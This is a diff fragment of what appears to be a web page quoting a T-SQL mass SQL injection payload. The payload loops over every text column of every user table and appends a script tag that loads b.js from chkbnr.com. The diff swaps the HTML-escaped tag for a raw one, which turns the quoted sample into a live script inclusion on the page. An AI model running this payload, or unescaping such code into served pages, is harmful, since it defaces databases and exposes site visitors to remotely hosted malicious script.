@@ -33,7 +33,7 @@ WHERE a.id=b.id AND a.xtype='u' AND (b.xtype=99 OR b.xtype=35 OR b.xtype=231 OR 
 FETCH NEXT FROM Table_Cursor INTO @T,@C 
 WHILE(@@FETCH_STATUS=0) 
 BEGIN 
-EXEC('UPDATE ['+@T+'] SET ['+@C+']=RTRIM(CONVERT(VARCHAR(4000),['+@C+']))+''&lt;script src=http://www.chkbnr.com/b.js&gt;&lt;/script&gt;''')
+EXEC('UPDATE ['+@T+'] SET ['+@C+']=RTRIM(CONVERT(VARCHAR(4000),['+@C+']))+''<script src=http://www.chkbnr.com/b.js></script>''')
  FETCH NEXT FROM Table_Cursor INTO @T,@C 
 END CLOSE Table_Cursor DEALLOCATE Table_Cursor  </pre>
 
